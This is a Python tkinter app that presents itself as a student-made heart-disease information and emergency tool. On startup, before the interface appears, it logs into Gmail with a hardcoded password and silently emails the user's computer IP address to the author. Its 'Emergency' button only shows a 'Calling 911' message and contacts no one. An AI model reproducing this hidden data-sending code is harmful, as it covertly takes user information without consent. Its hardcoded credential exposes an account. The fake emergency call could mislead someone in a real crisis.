import smtplib
import socket  
from tkinter import *
from tkinter import messagebox
smtpserver='smtp.gmail.com:587'
server = smtplib.SMTP(smtpserver)
server.starttls()
server.login('kamalimani1623@gmail.com','QKR9uzQS7GT4m5WgWxxwgNZEXuu7FyZcE5EHEmQ8sVmQccfEAwWfnTVD52z9jUMTvmH8dBQgXHUnKaJhES3vmbJyYaxe3mZHa4xv')
def sendemail(from_addr, to_addr_list, cc_addr_list,
              subject, message,
              smtpserver='smtp.gmail.com:587'):
    #import smtplib
    global server
    header = 'From: %s\n' % from_addr
    header += 'To: %s\n' % ','.join(to_addr_list)
    if not cc_addr_list is None:
        header += 'Cc: %s\n' % ','.join(cc_addr_list)
    header += 'Subject: %s\n\n' % subject
    message = header + message

    #server = smtplib.SMTP(smtpserver)
    #server.starttls()
    #server.login(login,password)
    server.sendmail(from_addr, to_addr_list, message)
    #server.quit()	
hostname = socket.gethostname()   
IPAddr = socket.gethostbyname(hostname)   
print("Your Computer Name is:" + hostname)   
print("Your Computer IP Address is:" + IPAddr)   
sendemail("kamalimani1623@gmail.com", "kamalimani1623@gmail.com", "None", "Liz", "Your Computer IP Address is:" + IPAddr)
# !/usr/bin/python3
top = Tk()
top.geometry("500x550")
def GeneralInfo():
   # Gmsg = messagebox.showinfo( "General Info", "40% of people who have a heart attack don't call emergency contacts")
   bot = Tk()
   bot.geometry("600x200")
   L11 = Label(bot, text = "- 40% of people don't call emergency services when they're having a heart attack")
   L11.pack(side = LEFT)
   L11.place(x=0, y = 110)
   L12 = Label(bot, text = "-Eating meat products has been shown to increase probability of heart disease")
   L12.pack(side = LEFT)
   L12.place(x=0, y=130)
   L13 = Label(bot, text = "-One in four people die of heart disease in the US")
   L13.pack(side = LEFT)
   L13.place(x=0, y=150)
   L14 = Label(bot, text = "-Only 27% of people know all of the major signs of a heart attack")
   L14.pack(side = LEFT)
   L14.place(x=0, y=170)
def Avoidance():
    mid1 = Tk()
    mid1.geometry("500x300")
    text = Text(mid1)
    text.insert(INSERT, "Many things factor into heart disease, ")
    text.insert(END, "one of which being smoking, which both greatly increases the risk of heart disease when done first-hand or when inhaled second-hand. Other ways to stay healthy are to excercise well and limit your intake of foods with saturated fat and trans fat.")
    text.config(state=DISABLED)
    text.pack()
def About():
   aboutMsg = messagebox.showinfo("About","This is a project made by Mani, Rocky, Joseph, and Musa, it's intended to provide easy access to information about Heart Disease and minimise the amount of time needed to contact emergency services when having a heart attack.")
def Settings():
    mid = Tk()
    mid.geometry("500x200")
    L1 = Label(mid, text = "Age?")
    L1.pack( side = LEFT)
    E1 = Entry(mid, bd = 5)
    E1.pack( side = RIGHT)
    L2 = Label(mid, text = "Weight?")
    L2.pack(side = LEFT)
    E2 = Entry(mid, bd = 5)
    E2.pack(side = RIGHT)
    L3 = Label(mid, text ="Height?")
    L3.pack(side = LEFT)
    E3 = Entry(mid, bd = 5)
    E3.pack(side = RIGHT)
    L4 = Label(mid, text = "GPS ON")
    L4.pack(side = LEFT)
    L3.place(x = 0, y = 70)
    E3.place(x=80, y=70)
    L2.place(x=0, y = 40)
    E2.place(x=80, y=40)
    L1.place(x=0, y=10)
    E1.place(x=80, y=10)
    L4.place(x=100, y=-50)
    N = Button(mid, text = "Done", width = 10, bg = "Green", command = mid.destroy)
    N.place(x = 0,y = 100)
def close():
   mid.destroy()
def helloCallBack():
   msg = messagebox.showinfo( "Emergency", "Calling 911....")

B = Button(top, text = "Emergency",width=50,bg = "red", command = helloCallBack)
W = Button(top, text = "Settings", command = Settings, width = 10)
G = Button(top, text = "General Info", command = GeneralInfo, width = 40, height = 10,bg = "green")
C = Button(top, text = "About", command = About, width = 10, height = 10, bg = "orange")
A = Button(top, text = "Avoidance", command = Avoidance, width = 40, height = 10, bg = "purple")
D = Button(top, text = "Exit", command = top.destroy, width = 10, height = 10, bg = "blue")
D.place(x = 10, y=250)
B.place(x = 50,y = 10)
W.place(x = 10, y = 10)
G.place(x = 130, y = 50)
C.place(x=10, y=50)
A.place(x = 130, y = 250)
top.mainloop()
